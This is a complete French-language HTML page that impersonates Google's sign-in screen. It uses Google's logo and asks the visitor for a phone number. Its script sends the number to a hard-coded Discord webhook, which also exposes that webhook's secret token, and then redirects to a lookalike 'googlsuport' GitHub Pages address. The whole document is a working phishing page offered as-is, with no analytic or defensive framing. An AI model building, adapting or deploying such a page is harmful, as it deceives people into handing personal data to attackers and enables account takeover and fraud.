<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Connexion - Google</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    /* Styles identiques à ta version précédente */
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background: #fff;
      color: #202124;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      width: 320px;
      text-align: center;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      font-size: 16px;
    }
    button {
      background-color: #1a73e8;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background-color: #1669c1;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" />
    <h1>Connexion</h1>
    <p>Entrez votre numéro de téléphone pour continuer</p>
    <input type="tel" id="phone" placeholder="+33 6 12 34 56 78" autocomplete="tel" />
    <button id="sendBtn">Suivant</button>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1399331411558797363/L-4Sn5hwtib-iQQei_gP1pPrCqf0jRYWiridji5jA2sGajdEdCzIX1uymbsWIEunmUWs";
    const phoneInput = document.getElementById('phone');
    const sendBtn = document.getElementById('sendBtn');

    sendBtn.addEventListener('click', () => {
      const phone = phoneInput.value.trim();
      if (!phone) {
        alert("Veuillez entrer un numéro de téléphone");
        phoneInput.focus();
        return;
      }
      fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: `Numéro de téléphone reçu : ${phone}` })
      })
      .then(() => {
        setTimeout(() => {
          window.location.href = "https://googlsuport.github.io/googleproblem/";
        }, 800);
      })
      .catch(() => alert("Erreur lors de l'envoi."));
    });

    phoneInput.addEventListener('keydown', e => {
      if (e.key === 'Enter') sendBtn.click();
    });
  </script>
</body>
</html>
